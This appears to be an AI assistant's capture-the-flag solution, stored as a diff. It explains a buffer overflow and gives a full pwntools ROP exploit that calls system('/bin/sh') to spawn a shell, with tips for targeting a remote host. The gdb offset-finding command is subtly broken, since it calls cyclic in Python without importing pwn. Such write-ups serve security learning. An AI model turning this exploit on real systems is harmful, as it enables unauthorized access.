@@ -1,0 +1,111 @@
+To solve this challenge using `pwntools`, you need to exploit the buffer overflow vulnerability in the `vulnerable_function` to perform a Return-Oriented Programming (ROP) attack. The goal is to execute the `/bin/sh` string using the `system` function, which is present in the binary.
+
+Here are the steps and the corresponding code:
+
+---
+
+### Steps to Solve the Challenge
+
+1. **Analyze the Binary**:
+   - The `vulnerable_function` has a buffer overflow vulnerability because it reads up to `0x200` bytes into a buffer of size `128` bytes.
+   - The binary contains the `system` function and the `/bin/sh` string, which can be used to spawn a shell.
+
+2. **Find the Offsets**:
+   - Determine the offset to overwrite the return address using a cyclic pattern.
+
+3. **Build the ROP Chain**:
+   - Use the `pop rdi; ret` gadget to set up the argument for the `system` function.
+   - Pass the address of the `/bin/sh` string as the argument to `system`.
+
+4. **Exploit the Binary**:
+   - Send the payload to the binary to execute the ROP chain and spawn a shell.
+
+---
+
+### Code to Solve the Challenge
+
+Here is the Python code using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up the binary
+binary = './rop'
+elf = ELF(binary)
+rop = ROP(elf)
+
+# Start the process
+p = process(binary)
+
+# Step 1: Find the offset
+# Use cyclic to generate a pattern and find the offset
+offset = 136  # Found using cyclic and gdb/pattern search
+
+# Step 2: Find the gadgets and addresses
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  # Gadget to control RDI
+system = elf.symbols['system']  # Address of system()
+bin_sh = next(elf.search(b'/bin/sh'))  # Address of "/bin/sh" string
+
+log.info(f"pop rdi gadget: {hex(pop_rdi)}")
+log.info(f"system address: {hex(system)}")
+log.info(f"/bin/sh address: {hex(bin_sh)}")
+
+# Step 3: Build the payload
+payload = b'A' * offset  # Padding to overwrite the return address
+payload += p64(pop_rdi)  # pop rdi; ret gadget
+payload += p64(bin_sh)   # Address of "/bin/sh"
+payload += p64(system)   # Address of system()
+
+# Step 4: Send the payload
+p.sendline(payload)
+
+# Step 5: Interact with the shell
+p.interactive()
+```
+
+---
+
+### Explanation of the Code
+
+1. **Binary Setup**:
+   - Load the binary using `pwntools`' `ELF` class to extract symbols and gadgets.
+
+2. **Finding the Offset**:
+   - Use a cyclic pattern to determine the exact offset where the return address is overwritten. This is done using `cyclic` in `pwntools` and debugging tools like `gdb`.
+
+3. **ROP Chain Construction**:
+   - Use the `pop rdi; ret` gadget to set up the first argument (`/bin/sh`) for the `system` function.
+   - Use the address of the `system` function and the `/bin/sh` string from the binary.
+
+4. **Payload Construction**:
+   - Construct the payload with padding, the ROP chain, and the addresses.
+
+5. **Exploitation**:
+   - Send the payload to the binary and interact with the spawned shell.
+
+---
+
+### Notes
+
+- **Finding the Offset**:
+  If you need to find the offset, you can use:
+  ```python
+  from pwn import *
+  print(cyclic(200))  # Generate a cyclic pattern
+  ```
+  Then, run the binary in `gdb` and check where the crash occurs:
+  ```
+  gdb ./rop
+  run < <(python -c 'print(cyclic(200))')
+  ```
+  Use `pwn cyclic -l <value>` to find the offset.
+
+- **Debugging**:
+  Use `gdb` or `pwndbg` to debug the binary and verify the payload.
+
+- **Remote Exploitation**:
+  If the challenge is hosted remotely, replace `process(binary)` with `remote(host, port)`.
+
+---
+
+This code should work for the given challenge and spawn a shell. Let me know if you need further clarification!
